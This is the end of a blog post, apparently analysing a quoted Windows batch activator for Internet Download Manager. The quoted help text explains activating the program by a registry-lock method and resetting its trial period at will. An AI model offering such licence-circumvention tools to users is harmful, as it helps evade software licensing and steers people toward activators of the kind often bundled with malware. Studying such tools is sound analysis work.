+</span></span><span class=line><span class=cl>_________________________________
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>   Activation:
+</span></span><span class=line><span class=cl>_________________________________
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl> - This tool applies registry lock method to activate Internet download manager (IDM).
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl> - This method requires Internet at the time of activation.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl> - IDM updates can be installed directly without having to activate again.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl> - After the activation, if in some case, the IDM starts to show activation nag screen, 
+</span></span><span class=line><span class=cl>   then just run the activation option again.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>_________________________________
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>   Reset IDM Activation / Trial:
+</span></span><span class=line><span class=cl>_________________________________
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl> - Internet download manager provides 30 days trial period, you can use this script to 
+</span></span><span class=line><span class=cl>   reset this Activation / Trial period whenever you want.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl> - This option also can be used to restore status if in case the IDM reports fake serial
+</span></span><span class=line><span class=cl>   key and other similar errors.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>_________________________________
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>   OS requirement:
+</span></span><span class=line><span class=cl>_________________________________
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl> - Project is supported only for Windows 7/8/8.1/10/11 and their Server equivalent.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>_________________________________
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl> - Troubleshooting steps:
+</span></span><span class=line><span class=cl>_________________________________
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl> - If any other activator was used to activate IDM previously then make sure to properly
+</span></span><span class=line><span class=cl>   uninstall it with that same activator (if there is an option), this is especially important
+</span></span><span class=line><span class=cl>   <span class=k>if</span> any<span class=err> registry / firewall block method was used.</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl> - Uninstall the IDM from control panel.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl> - Make sure the latest original IDM setup is used for the installation,
+</span></span><span class=line><span class=cl>   you can download it from https://www.internetdownloadmanager.com/download.html
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl> - Now install the IDM and use the activate option.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>____________________________________________________________________________________________________
+</span></span><span class=line><span class=cl><span class=p>:</span><span class=nl>txt</span><span class=c1>:</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>:</span><span class=c1>:========================================================================================================================================</span>
+</span></span></code></pre></div></li></ul></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-line><div class=post-info-mod><span>Updated on 2023-11-13</span></div></div><div class=post-info-line><div class=post-info-md></div><div class=post-info-share><span></span></div></div></div><div class=post-info-more><section class=post-tags><i class="fas fa-tags fa-fw" aria-hidden=true></i>&nbsp;<a href=/tags/cybersecurity/>cybersecurity</a>,&nbsp;<a href=/tags/reverse/>Reverse</a>,&nbsp;<a href=/tags/malware/>malware</a></section><section><span><a href=javascript:void(0); onclick=window.history.back()>Back</a></span>&nbsp;|&nbsp;<span><a href=/>Home</a></span></section></div><div class=post-nav><a href=/posts/writeup-for-orgctf2-crypto/ class=prev rel=prev title="Writeup for ORGCTF2: Crypto.my_own_cryptography"><i class="fas fa-angle-left fa-fw" aria-hidden=true></i>Writeup for ORGCTF2: Crypto.my_own_cryptography</a></div></div></article></div></main><footer class=footer><div class=footer-container><div class=footer-line itemscope itemtype=http://schema.org/CreativeWork><i class="far fa-copyright fa-fw" aria-hidden=true></i><span itemprop=copyrightYear>2022 - 2023</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=www.debidong.github.io target=_blank>debidong</a></span>&nbsp;|&nbsp;<span class=license><a rel="license external nofollow noopener noreffer" href=https://creativecommons.org/licenses/by-nc/4.0/ target=_blank>CC BY-NC 4.0</a></span></div></div></footer></div><div id=fixed-buttons><a href=# id=back-to-top class=fixed-button title="Back to Top"><i class="fas fa-arrow-up fa-fw" aria-hidden=true></i>
 </a><a href=# id=view-comments class=fixed-button title="View Comments"><i class="fas fa-comment fa-fw" aria-hidden=true></i></a></div><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/katex.min.css><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/katex.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/contrib/auto-render.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/contrib/copy-tex.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/contrib/mhchem.min.js></script><script type=text/javascript>window.config={code:{copyTitle:"Copy to clipboard",maxShownLines:50},comment:{},math:{delimiters:[{display:!0,left:"$$",right:"$$"},{display:!0,left:"\\[",right:"\\]"},{display:!0,left:"\\begin{equation}",right:"\\end{equation}"},{display:!0,left:"\\begin{equation*}",right:"\\end{equation*}"},{display:!0,left:"\\begin{align}",right:"\\end{align}"},{display:!0,left:"\\begin{align*}",right:"\\end{align*}"},{display:!0,left:"\\begin{alignat}",right:"\\end{alignat}"},{display:!0,left:"\\begin{alignat*}",right:"\\end{alignat*}"},{display:!0,left:"\\begin{gather}",right:"\\end{gather}"},{display:!0,left:"\\begin{CD}",right:"\\end{CD}"},{display:!1,left:"$",right:"$"},{display:!1,left:"\\(",right:"\\)"}],strict:!1}}</script><script type=text/javascript src=/js/theme.min.js></script></body></html>
